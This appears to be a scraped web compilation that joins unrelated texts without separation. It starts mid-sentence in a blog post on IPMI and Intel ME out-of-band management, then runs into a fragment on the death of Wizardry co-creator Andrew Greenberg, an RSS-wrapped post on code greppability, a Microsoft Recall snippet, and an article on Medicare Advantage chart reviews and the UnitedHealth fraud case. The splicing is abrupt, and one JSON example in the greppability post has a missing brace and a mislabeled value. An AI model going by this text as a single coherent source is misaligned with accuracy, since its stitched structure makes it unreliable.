or LPC bus, which is a weird little holdover of ISA present in most modern
computers). The result is that you can interact with the IPMI from a tool
running in the operating system, like ipmitool on Linux. That makes it a little
confusing what exactly is going on, if you don't understand that the IPMI is a
completely independent system that has a local interface to the running
operating system for convenience.</p>
<p>What does the IPMI actually <em>do?</em> Well, like most things, it's mostly become a
webapp. Web interfaces are just too convenient to turn down, so while a lot of
IPMI products do have dedicated client software, they're porting all the
features into an embedded web application. The quality of these web interfaces
varies widely but is mostly not very good. That raises a question, of course,
of how you <em>get</em> to the IPMI web interface.</p>
<p>Most servers on the market have a dedicated ethernet interface for the IPMI,
often labelled "IPMI" or "management" or something like that. Most people would
agree that the best way to use IPMI is to put the management network interface
onto a dedicated physical network, for reasons of both security and reliability
(IPMI should remain accessible even in case of performance or reliability
problems with your main network). A dedicated physical network costs time,
space, and money, though, so there are compromises. For one, your "management
network" is very likely to be a VLAN on your normal network equipment. That's
sort of like what AT&amp;T calls a common-carrier switching arrangement, meaning
that it behaves like an independent, private network but shares all of the
actual equipment with everything else, the isolation being implemented in
software. That was a weird comparison to make and I probably just need to write
a whole article on CCSAs like I've been meaning to.</p>
<p>Even that approach requires extra cabling, though, so IPMI offers "sideband"
networking. With sideband management, the BMC communicates directly with the
same NIC that the operating system uses. The implementation is a little bit
weird: the NIC will pretend to be two different interfaces, mixing IPMI traffic
into the same packet stream as host traffic but using a <em>different MAC
address.</em> This way, it appears to other network equipment as if there are two
different network interfaces in use, as usual. I will leave judgment as to how
good of an idea this is to you, but there are obvious security considerations
around reducing the segregation between IPMI and application traffic.</p>
<p>And yes, it should be said, a lot of IPMI implementations have proven to be
security nightmares. They should never be accessible to any untrusted person.</p>
<p>Details of network features vary between IPMI implementations, but there is a
standard interface on UDP 623 that can be used for discovery and basic
commands. There's often SSH and a web interface, and VNC is pretty common for
remote console.</p>
<p>There are some neat basic functions you can perform with the IPMI, either over
the network or locally using an in-band IPMI client. A useful one, if you are
forgetful and keep poor records like I do, is listing the hardware modules
making up the machine at an FRU or vendor part number level. You can also
interact with basic hardware functions like sensors, power state, fans, etc.
IPMI offers a standard watchdog timer, which can be combined with software
running on the operating system to ensure that the server will be reset if
the application gets into an unhealthy state. You should set a long enough
timeout to allow the system to boot and for you to connect and disable the
watchdog timer, ask me how I know.</p>
<p>One of the reasons I thought to write about IPMI is its strange relationship to
the world of everyday client computers. IPMI is very common in enterprise
servers but very rare elsewhere, much to the consternation of people like me
that don't have the space or noise tolerance for a 1U pizzabox in their homes.
If you are trying to stick to compact or low-power computers, you'll pretty
much have to go without.</p>
<p>But then, there's kind of a weird exception. What about Intel ME and AMD ST?
These are essentially OOB management controllers that are present in virtually
all Intel and AMD processors. This is kind of an odd story. Intel ME, the
Management Engine, is an enabling component of Intel Active Management
Technology (Intel AMT). AMT was pretty much an attempt at popularizing OOB
management for client machines, and offers most of the same capabilities as
IPMI. It has been considerably less successful. Most of that is probably due to
pricing, Intel has limited almost all AMT features to use with their very
costly enterprise management platforms. Perhaps there is some industry in which
these sell well, but I am apparently not in it. There are open-source AMT
clients, but the next problem you will run into is finding a machine where AMT
is actually usable.</p>
<p>The fact that Intel AMT has sideband management capability, and that therefore
the Intel ME component on which AMT runs has sideband management capability,
was the topic of quite some consternation in the security community. Here is a
mitigating factor: sideband management is only possible if the processor,
motherboard chipset, and NIC are all AMT-capable. Options for all three devices
are limited to Intel products with the vPro badge. The unpopularity of Intel
NICs in consumer devices alone means that sideband access is rarely possible.
vPro is also limited to relatively high-end processors and chipsets. The bad
news is that you will have a hard time using AMT in your homelab, although some
people certainly do. The upside is that the widely-reported "fact" that Intel
ME is accessible via sideband networking on consumer devices is typically
untrue, and for reasons beyond Intel software licensing.</p>
<p>That leaves an odd question around Intel ME itself, though, which is certainly
OOB management-like but doesn't really have any OOB management features without
AMT. So why do nearly all processors have it? Well, this is somewhat
speculative, but the impression I get is that Intel ME exists mostly as a
convenient way to host and manage trusted execution components that are used
for things like Secure Boot and DRM. These features all run on the same
processor as ME and share some common technology stack. The "management"
portion of Intel ME is thus largely vestigial, and it's part of the secure
computing infrastructure.</p>
<p>This is not to make excuses for Intel ME, which is entirely unauditable by
third parties and has harbored significant security vulnerabilities in the
past. But, remember, we all use one processor architecture from one of two
vendors, so Intel doesn't have a whole lot of motivation to do better. Lest
you respond that ARM is the way, remember that modern ARM SOCs used in
consumer devices have pretty much identical capabilities.</p>
<p>It is what it is.</p>
<p>[1] The definition of "headless" is sticky and we have to not get stuck on it
too much. People tend to say "headless" to mean no monitor and keyboard
attached, but keep in mind that slide-out rack consoles and IP KVMs have been
common for a long time and so in non-hyperscale environments truly headless
machines are rarer than you would think. Part of this is because using a serial
console is a monumental pain in the ass, so your typical computer operator will
do a lot to avoid dealing with it. Before LCD displays, this meant a CRT and
keyboard on an Anthro cart with wheels, but now that we are an enlightened
society, you can cram a whole monitor and keyboard into 1U and get a KVM
switching fabric that can cover the whole rack. Or swap cables. Mostly swap
cables.</p>

<p>Released in 1981, Wizardry was one of the first RPGs for personal computers and would prove to be a huge influence on the development of the genre. It was also a massive success in Japan and continues to receive new installments in that market.</p>
<p>More recently, the original game was <a href="https://www.timeextension.com/games/switch-eshop/wizardry_proving_grounds_of_the_mad_overlord">remastered</a> by Digital Eclipse for modern systems.</p>
<figure><a title="Wizardry Co-Creator Andrew Greenberg Has Passed Away 2" href="https://images.timeextension.com/112de465423ec/wizardry-co-creator-andrew-greenberg-has-passed-away-2.large.png"><img src="https://images.timeextension.com/112de465423ec/wizardry-co-creator-andrew-greenberg-has-passed-away-2.original.jpg" width="900" height="605" loading="lazy" alt="Wizardry Co-Creator Andrew Greenberg Has Passed Away 2"></a><figcaption><em><span></span> Image: <a href="https://www.facebook.com/madoverlord/posts/8270753369641433#?aeh">Robert Woodhead</a></em></figcaption></figure>
<p>Greenberg – who lent his name to the antagonist of the first Wizardry game (Werdna is Andrew spelt backwards) – would later work as a patent attorney and general counsel for a renewable energy company.</p>
<p>Our thoughts are with Greenberg's family and friends at this difficult time.</p>

            <description><![CDATA[<p>URL: <a href="https://morizbuesing.com/blog/greppability-code-metric/">https://morizbuesing.com/blog/greppability-code-metric/</a>, See on <a href="https://news.ycombinator.com/item?id=41430772">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <p>When I‘m working on maintaining an unfamiliar codebase, I will spend a lot of
time grepping the code base for strings. Even in projects exclusively written
by myself, I have to search a lot: function names, error messages,
class names, that kind of thing. If I can‘t find what I‘m looking for, it‘ll
be frustrating in the best case, or in the worst case lead to dangerous
situations where I‘ll assume a thing is not needed anymore, since I can‘t find
any references to it in the code base. From these situations, I‘ve derived some
rules you can apply to keep your code base greppable:</p>
<h2 id="dont-split-up-identifiers">Don‘t split up identifiers</h2>
<p>It turns out that splitting up, or dynamically constructing identifiers is a
bad idea.</p>
<p>Suppose you have two database tables <code>shipping_addresses</code>, <code>billing_addresses</code>,
it might seem like a perfectly good solution to construct the table name
dynamically from the order type.</p>
<pre tabindex="0"><code><span><span>const</span><span> getTableName</span><span> =</span><span> (addressType</span><span>:</span><span> 'shipping'</span><span> |</span><span> 'billing'</span><span>) </span><span>=&gt;</span><span> {</span></span>
<span><span>    return</span><span> `${</span><span>addressType</span><span>}_addresses`</span></span>
<span><span>}</span></span></code></pre>
<p>Though it looks nice and DRY, it‘s not great for maintainenance: someone will
inevitably search the code base for the table name <code>shipping_addresses</code> and
miss this occurence.</p>
<p>Refactored for greppability:</p>
<pre tabindex="0"><code><span><span>const</span><span> getTableName</span><span> =</span><span> (addressType</span><span>:</span><span> 'shipping'</span><span> |</span><span> 'billing'</span><span>) </span><span>=&gt;</span><span> {</span></span>
<span><span>    if</span><span> (</span><span>addressType</span><span> ===</span><span> 'shipping'</span><span>) {</span></span>
<span><span>        return</span><span> 'shipping_addresses'</span></span>
<span><span>    }</span></span>
<span><span>    if</span><span> (</span><span>addressType</span><span> ===</span><span> 'billing'</span><span>) {</span></span>
<span><span>        return</span><span> 'billing_addresses'</span></span>
<span><span>    }</span></span>
<span><span>    throw</span><span> new</span><span> TypeError</span><span>(</span><span>'addressType must be billing or shipping'</span><span>)</span></span>
<span><span>}</span></span></code></pre>
<p>The same goes for column names, object fields, and, god forbid, method/function
names (it‘s easily possible to dynamically construct method names with javascript).</p>
<h2 id="use-the-same-names-for-things-across-the-stack">Use the same names for things across the stack</h2>
<p>Don‘t rename fields at application boundaries to match naming schemes. An obvious
example is then importing postgres-style snake_case identifiers into
javascript, then converting them to camelCase. This makes it harder to
find—you now have to grep for two strings instead of one in order to find all
occurences!</p>
<pre tabindex="0"><code><span><span>const</span><span> getAddress</span><span> =</span><span> async</span><span> (id</span><span>:</span><span> string</span><span>) </span><span>=&gt;</span><span> {</span></span>
<span><span>    const</span><span> address</span><span> =</span><span> await</span><span> getAddressById</span><span>(</span><span>id</span><span>)</span></span>
<span><span>    return</span><span> {</span></span>
<span><span>        streetName: </span><span>address</span><span>.</span><span>street_name</span><span>,</span></span>
<span><span>        zipCode: </span><span>address</span><span>.</span><span>zip_code</span><span>,</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre>
<p>You‘re better off biting the bullet and returning the object directly:</p>
<pre tabindex="0"><code><span><span>const</span><span> getAddress</span><span> =</span><span> async</span><span> (id</span><span>:</span><span> string</span><span>) </span><span>=&gt;</span><span> {</span></span>
<span><span>    return</span><span> await</span><span> getAddressById</span><span>(</span><span>id</span><span>)</span></span>
<span><span>}</span></span></code></pre>
<h2 id="flat-is-better-than-nested">Flat is better than nested</h2>
<p>Taking inspiration from the <a href="https://peps.python.org/pep-0020/">Zen of Python</a>,
when dealing with namespaces, flattening your folders/object structures is mostly better
than nesting.</p>
<p>For example if you have two choices to set up your translation files:</p>
<pre tabindex="0"><code><span><span>{</span></span>
<span><span>    "auth"</span><span>: {</span></span>
<span><span>        "login"</span><span>: {</span></span>
<span><span>            "title"</span><span>: </span><span>"Login"</span><span>,</span></span>
<span><span>            "emailLabel"</span><span>: </span><span>"Email"</span><span>,</span></span>
<span><span>            "passwordLabel"</span><span>: </span><span>"Password"</span><span>,</span></span>
<span><span>        },</span></span>
<span><span>        "register"</span><span>:</span></span>
<span><span>            "title"</span><span>: </span><span>"Register"</span><span>,</span></span>
<span><span>            "emailLabel"</span><span>: </span><span>"Email"</span><span>,</span></span>
<span><span>            "passwordLabel"</span><span>: </span><span>"Password"</span><span>,</span></span>
<span><span>        }</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre>
<p>and</p>
<pre tabindex="0"><code><span><span>{</span></span>
<span><span>    "auth.login.title"</span><span>: </span><span>"Login"</span><span>,</span></span>
<span><span>    "auth.login.emailLabel"</span><span>: </span><span>"Email"</span><span>,</span></span>
<span><span>    "auth.login.passwordLabel"</span><span>: </span><span>"Password"</span><span>,</span></span>
<span><span>    "auth.register.title"</span><span>: </span><span>"Login"</span><span>,</span></span>
<span><span>    "auth.register.emailLabel"</span><span>: </span><span>"Email"</span><span>,</span></span>
<span><span>    "auth.register.passwordLabel"</span><span>: </span><span>"Password"</span><span>,</span></span>
<span><span>}</span></span></code></pre>
<p>take the second option! You will be able to easily find your keys now, which
you are probably referring to as something like <code>t('auth.login.title')</code>.</p>
<p>Or consider React component structure: a component stucture like</p>
<pre tabindex="0"><code><span><span>./components/AttributeFilterCombobox.tsx</span></span>
<span><span>./components/AttributeFilterDialog.tsx</span></span>
<span><span>./components/AttributeFilterRating.tsx</span></span>
<span><span>./components/AttributeFilterSelect.tsx</span></span></code></pre>
<p>is preferable to</p>
<pre tabindex="0"><code><span><span>./components/attribute/filter/Combobox.tsx</span></span>
<span><span>./components/attribute/filter/Dialog.tsx</span></span>
<span><span>./components/attribute/filter/Rating.tsx</span></span>
<span><span>./components/attribute/filter/Select.tsx</span></span></code></pre>
<p>from a greppability perspective, since you‘ll be able to grep for the
whole namespaced component <code>AttributeFilterCombobox</code> just from the usage, as
opposed to just <code>Dialog</code>, which you might have multiple of accross your
application.</p>  </div></div>]]></description>

<p>When Microsoft announced Recall, it was intended to be baked into Windows 11's functions. The feature tracks everything you do on compatible Windows PCs and uses an on-device generative AI model to retrieve particular information a user is looking for, by filing through a library of screenshots saved on the device. Critics of the feature immediately pointed out that it is highly susceptible to cybersecurity flaws since it indiscriminately saves sensitive information like passwords, confidential work, and personal information. </p><section x-data="window.newsletter()" x-init="init()" data-ga-impression="" data-ga-category="newsletters" data-ga-module="incontent_nl_signup" data-ga-label="mashablelightspeed">

<div id="readability-page-1" class="page"><div>
								
<p>A decade ago, federal officials drafted a plan to discourage Medicare Advantage health insurers from overcharging the government by billions of dollars — only to abruptly back off amid an “uproar” from the industry, newly released court filings show.</p>



<p>The Centers for Medicare &amp; Medicaid Services published the draft regulation in January 2014. The rule would have required health plans, when examining patient’s medical records, to identify overpayments by CMS and refund them to the government.</p>



<p>But in May 2014, CMS dropped the idea without any public explanation. Newly released court depositions show that agency officials repeatedly cited concern about pressure from the industry.</p>



<p>The 2014 decision by CMS, and events related to it, are at the center of a multibillion-dollar Justice Department civil fraud case against UnitedHealth Group pending in federal court in Los Angeles.</p>



<p>The Justice Department alleges the giant health insurer cheated Medicare out of more than $2 billion by reviewing patients’ records to find additional diagnoses, adding revenue while ignoring overcharges that might reduce bills. The company “buried its head in the sand and did nothing but keep the money,” DOJ said in a court filing.</p>



<p>Medicare pays health plans higher rates for sicker patients but requires that the plans bill only for conditions that are properly documented in a patient’s medical records.</p>



<p>In a court filing, UnitedHealth Group denies wrongdoing and argues it shouldn’t be penalized for “failing to follow a rule that CMS considered a decade ago but declined to adopt.”</p>



<p>This month, the parties in the court case made public thousands of pages of depositions and other records that offer a rare glimpse inside the Medicare agency’s long-running struggle to keep the private health plans from taking taxpayers for a multibillion-dollar ride.</p>



<p>“It’s easy to dump on Medicare Advantage plans, but CMS made a complete boondoggle out of this,” said Richard Lieberman, a Colorado health data analytics expert.</p>



<p>Spokespeople for the Justice Department and CMS declined to comment for this article. In an email, UnitedHealth Group spokesperson Heather Soule said the company’s “business practices have always been transparent, lawful and compliant with CMS regulations.”</p>

<p><strong>Missed Diagnoses</strong></p>



<p>Medicare Advantage insurance plans have grown explosively in recent years and now <a href="https://www.kff.org/medicare/issue-brief/medicare-advantage-in-2024-enrollment-update-and-key-trends/">enroll about 33 million members</a>, more than half of people eligible for Medicare. Along the way, the industry has been the target of dozens of whistleblower lawsuits, <a href="https://kffhealthnews.org/news/article/audits-hidden-until-now-reveal-millions-in-medicare-advantage-overcharges/">government audits</a>, and other investigations alleging the health plans often exaggerate how sick patients are to rake in undeserved Medicare payments — including by doing what are called chart reviews, intended to find allegedly missed diagnosis codes.</p>



<p>By 2013, CMS officials knew some Medicare health plans were hiring medical coding and analytics consultants to aggressively mine patient files — but they doubted the agency’s authority to demand that health plans also look for and delete unsupported diagnoses.</p>



<p>The proposed January 2014 regulation mandated that chart reviews “cannot be designed only to identify diagnoses that would trigger additional payments” to health plans.</p>



<p>CMS officials backed down in May 2014 because of “stakeholder concern and pushback,” Cheri Rice, then director of the CMS Medicare plan payment group, testified in a 2022 deposition made public this month. A second CMS official, Anne Hornsby, described the industry’s reaction as an “uproar.”</p>



<p>Exactly who made the call to withdraw the chart review proposal isn’t clear from court filings so far.</p>



<p>“The direction that we received was that the rule, the final rule, needed to include only those provisions that had wide, you know, widespread stakeholder support,” Rice testified.</p>



<p>“So we did not move forward then,” she said. “Not because we didn’t think it was the right thing to do or the right policy, but because it had mixed reactions from stakeholders.”</p>



<p>The CMS press office declined to make Rice available for an interview. Hornsby, who has since left the agency, declined to comment.</p>



<p>But Erin Fuse Brown, a professor at the Brown University School of Public Health, said the decision reflects a pattern of timid CMS oversight of the popular health plans for seniors.</p>



<p>“CMS saving money for taxpayers isn’t enough of a reason to face the wrath of very powerful health plans,” Fuse Brown said.</p>



<p>“That is extremely alarming.”</p>



<p><strong>Invalid Codes</strong></p>



<p>The fraud case against UnitedHealth Group, which runs the nation’s largest Medicare Advantage plan, was filed in 2011 by a former company employee. The DOJ <a href="https://www.justice.gov/opa/pr/united-states-intervenes-false-claims-act-lawsuit-against-unitedhealth-group-inc-mischarging">took over</a> the whistleblower suit in 2017.</p>



<p>DOJ alleges Medicare paid the insurer more than $7.2 billion from 2009 through 2016 solely based on chart reviews; the company would have received $2.1 billion less if it had deleted unsupported billing codes, the government says.</p>



<p>The government argues that UnitedHealth Group knew that many conditions it had billed for were not supported by medical records but chose to pocket the overpayments. For instance, the insurer billed Medicare nearly $28,000 in 2011 to treat a patient for cancer, congestive heart failure, and other serious health problems that weren’t recorded in the person’s medical record, DOJ alleged in a 2017 filing.</p>



<p>In all, DOJ contends that UnitedHealth Group should have deleted more than 2 million invalid codes.</p>



<p>Instead, company executives signed annual statements attesting that the billing data submitted to CMS was “accurate, complete, and truthful.” Those actions violated the False Claims Act, a federal law that makes it illegal to submit bogus bills to the government, DOJ alleges.</p>



<p>The complex case has featured years of legal jockeying, even pitting the recollections of key CMS staff members — including several who have since departed government for jobs in the industry — against those of UnitedHealthcare executives.</p>



<p><strong>‘Red Herring’</strong></p>



<p>Court filings describe a 45-minute video conference arranged by then-CMS administrator Marilyn Tavenner on April 29, 2014. Tavenner testified she set up the meeting between UnitedHealth and CMS staff at the request of Larry Renfro, a senior UnitedHealth Group executive, to discuss implications of the draft rule. Neither Tavenner nor Renfro attended.</p>



<p>Two UnitedHealth Group executives on the call said in depositions that CMS staffers told them the company had no obligation at the time to uncover erroneous codes. One of the executives, Steve Nelson, called it a “very clear answer” to the question. Nelson has since left the company.</p>



<p>For their part, four of the five CMS staffers on the call said in depositions that they didn’t remember what was said. Unlike the company’s team, none of the government officials took detailed notes.</p>



<p>“All I can tell you is I remember feeling very uncomfortable in the meeting,” Rice said in her 2022 deposition.</p>



<p>Yet Rice and one other CMS staffer said they did recall reminding the executives that even without the chart review rule, the company was obligated to make a good-faith effort to bill only for verified codes — or face possible penalties under the False Claims Act. And CMS officials reinforced that view in follow-up emails, according to court filings.</p>



<p>DOJ called the flap over the ill-fated regulation a “red herring” in a court filing and alleges that when UnitedHealth asked for the April 2014 meeting, it knew its chart reviews had been under investigation for two years. In addition, the company was “grappling with a projected $500 million budget deficit,” according to DOJ.</p>



<p><strong>Data Miners</strong></p>



<p>Medicare Advantage plans defend chart reviews against criticism that they do little but artificially inflate the government’s costs.</p>



<p>“Chart reviews are one of many tools Medicare Advantage plans use to support patients, identify chronic conditions, and prevent those conditions from becoming more serious,” said Chris Bond, a spokesperson for AHIP, a health insurance trade group.</p>



<p>Whistleblowers have argued that the <a href="https://publicintegrity.org/health/home-is-where-the-money-is-for-medicare-advantage-plans/">cottage industry</a> of analytics firms and coders that sprang up to conduct these reviews pitched their services as a huge moneymaking exercise for health plans — and little else.</p>



<p>“It was never legitimate,” said William Hanagami, a California attorney who represented whistleblower James Swoben in a <a href="https://www.justice.gov/usao-cdca/pr/medicare-advantage-provider-pay-270-million-settle-false-claims-act-liabilities">2009 case</a> that alleged chart reviews improperly inflated Medicare payments. In a <a href="https://cdn.ca9.uscourts.gov/datastore/opinions/2016/08/10/13-56746.pdf">2016 decision</a>, the 9th Circuit Court of Appeals wrote that health plans must exercise “due diligence” to ensure they submit accurate data.</p>



<p>Since then, other insurers have settled DOJ allegations that they billed Medicare for unconfirmed diagnoses stemming from chart reviews. In July 2023, Martin’s Point Health Plan, a Portland, Maine, insurer, <a href="https://www.justice.gov/opa/pr/martins-point-health-care-inc-pay-22485000-resolve-false-claims-act-allegations">paid $22,485,000</a> to settle whistleblower allegations that it improperly billed for conditions ranging from diabetes with complications to morbid obesity. The plan denied any liability.</p>



<p>A <a href="https://oig.hhs.gov/oei/reports/oei-03-17-00470.pdf">December 2019 report</a> by the Health and Human Services Inspector General found that 99% of chart reviews added new medical diagnoses at a cost to Medicare of an estimated $6.7 billion for 2017 alone.</p>
